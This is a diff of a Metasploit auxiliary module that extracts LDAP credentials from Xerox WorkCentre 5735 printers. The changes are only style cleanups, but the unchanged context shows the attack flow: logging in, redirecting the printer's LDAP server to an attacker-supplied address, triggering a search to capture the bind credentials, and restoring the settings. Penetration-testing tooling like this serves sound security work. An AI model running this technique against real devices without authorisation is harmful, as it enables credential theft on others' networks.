@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 #
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -11,20 +12,19 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::TcpServer
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Xerox Workcentre 5735 LDAP Service Redential Extractor',
-      'Description'    => %q{
-        This module extract the printer's LDAP username and password from Xerox Workcentre 5735.
-      },
-      'Author'         =>
-        [
-          'Deral "Percentx" Heiland',
-          'Pete "Bokojan" Arzamendi'
-        ],
-      'License'        => MSF_LICENSE,
-      'DefaultOptions' => { 'SSL' => false }
-    ))
+                      'Name'           => 'Xerox Workcentre 5735 LDAP Service Redential Extractor',
+                      'Description'    => %q(
+                        This module extract the printer's LDAP username and password from Xerox Workcentre 5735.
+                      ),
+                      'Author'         =>
+                        [
+                          'Deral "Percentx" Heiland',
+                          'Pete "Bokojan" Arzamendi'
+                        ],
+                      'License'        => MSF_LICENSE,
+                      'DefaultOptions' => { 'SSL' => false }))
 
     register_options(
       [
@@ -33,7 +33,8 @@ class MetasploitModule < Msf::Auxiliary
         OptInt.new('TIMEOUT', [true, 'Timeout for printer connection probe.', 20]),
         OptInt.new('TCPDELAY', [true, 'Number of seconds the tcp server will wait before termination.', 20]),
         OptString.new('NewLDAPServer', [true, 'The IP address of the LDAP server you want the printer to connect back to.'])
-      ], self.class)
+      ], self.class
+    )
   end
 
   def run
@@ -103,7 +104,7 @@ class MetasploitModule < Msf::Auxiliary
       'frmaltDomain' => 'default'
     }
     login_post_data = []
-    login_vars.each_pair{|k, v| login_post_data << "#{k}=#{v}" }
+    login_vars.each_pair { |k, v| login_post_data << "#{k}=#{v}" }
     login_post_data *= '&'
     method = 'POST'
 
@@ -139,13 +140,13 @@ class MetasploitModule < Msf::Auxiliary
     ldap_update_vars = {
       '_fun_function' => 'HTTP_Set_Config_Attrib_fn',
       'NextPage' => '/ldap/index.php?ldapindex=default',
-      'from' =>'ldapConfig',
+      'from' => 'ldapConfig',
       'ldap.server[default].server' => "#{datastore['NewLDAPServer']}:#{datastore['SRVPORT']}",
       'ldap.maxSearchResults' => '25',
-      'ldap.searchTime' => '30',
+      'ldap.searchTime' => '30'
     }
     ldap_update_post = []
-    ldap_update_vars.each_pair{|k, v| ldap_update_post << "#{k}=#{v}" }
+    ldap_update_vars.each_pair { |k, v| ldap_update_post << "#{k}=#{v}" }
     ldap_update_post *= '&'
     method = 'POST'
 
@@ -161,26 +162,26 @@ class MetasploitModule < Msf::Auxiliary
   def trigger_ldap_request
     ldap_trigger_page = '/userpost/xerox.set'
     ldap_trigger_vars = {
-      'nameSchema'=>'givenName',
-      'emailSchema'=>'mail',
-      'phoneSchema'=>'telephoneNumber',
-      'postalSchema'=>'postalAddress',
-      'mailstopSchema'=>'l',
-      'citySchema'=>'physicalDeliveryOfficeName',
-      'stateSchema'=>'st',
-      'zipCodeSchema'=>'postalcode',
-      'countrySchema'=>'co',
-      'faxSchema'=>'facsimileTelephoneNumber',
-      'homeSchema'=>'homeDirectory',
-      'memberSchema'=>'memberOf',
-      'uidSchema'=>'uid',
-      'ldapSearchName'=>'test',
-      'ldapServerIndex'=>'default',
-      '_fun_function'=>'HTTP_LDAP_Search_fn',
-      'NextPage'=>'%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'
+      'nameSchema' => 'givenName',
+      'emailSchema' => 'mail',
+      'phoneSchema' => 'telephoneNumber',
+      'postalSchema' => 'postalAddress',
+      'mailstopSchema' => 'l',
+      'citySchema' => 'physicalDeliveryOfficeName',
+      'stateSchema' => 'st',
+      'zipCodeSchema' => 'postalcode',
+      'countrySchema' => 'co',
+      'faxSchema' => 'facsimileTelephoneNumber',
+      'homeSchema' => 'homeDirectory',
+      'memberSchema' => 'memberOf',
+      'uidSchema' => 'uid',
+      'ldapSearchName' => 'test',
+      'ldapServerIndex' => 'default',
+      '_fun_function' => 'HTTP_LDAP_Search_fn',
+      'NextPage' => '%2Fldap%2Fmappings.php%3Fldapindex%3Ddefault%26from%3DldapConfig'
     }
     ldap_trigger_post = []
-    ldap_trigger_vars.each_pair {|k, v| ldap_trigger_post << "#{k}=#{v}" }
+    ldap_trigger_vars.each_pair { |k, v| ldap_trigger_post << "#{k}=#{v}" }
     ldap_trigger_post *= '&'
     method = 'POST'
 
@@ -239,7 +240,7 @@ class MetasploitModule < Msf::Auxiliary
       'ldap.search.membership' => 'memberOf'
     }
     ldap_restore_post = []
-    ldap_restore_vars.each_pair {|k, v| ldap_restore_post << "#{k}=#{v}" }
+    ldap_restore_vars.each_pair { |k, v| ldap_restore_post << "#{k}=#{v}" }
     ldap_restore_post *= '&'
     method = 'POST'
 
@@ -257,12 +258,13 @@ class MetasploitModule < Msf::Auxiliary
 
     begin
       res = send_request_cgi(
-      {
-        'uri'       => page,
-        'method'    => method,
-        'cookie'    => @auth_cookie,
-        'data'      => post_data
-      }, datastore['TIMEOUT'].to_i)
+        {
+          'uri'       => page,
+          'method'    => method,
+          'cookie'    => @auth_cookie,
+          'data'      => post_data
+        }, datastore['TIMEOUT'].to_i
+      )
 
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("Connection failed.")
@@ -274,7 +276,7 @@ class MetasploitModule < Msf::Auxiliary
   def register_creds(service_name, remote_host, remote_port, username, password)
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       workspace_id: myworkspace.id,
       private_data: password,
       private_type: :password,
@@ -300,6 +302,5 @@ class MetasploitModule < Msf::Auxiliary
 
     login_data.merge!(service_data)
     create_credential_login(login_data)
-
   end
 end
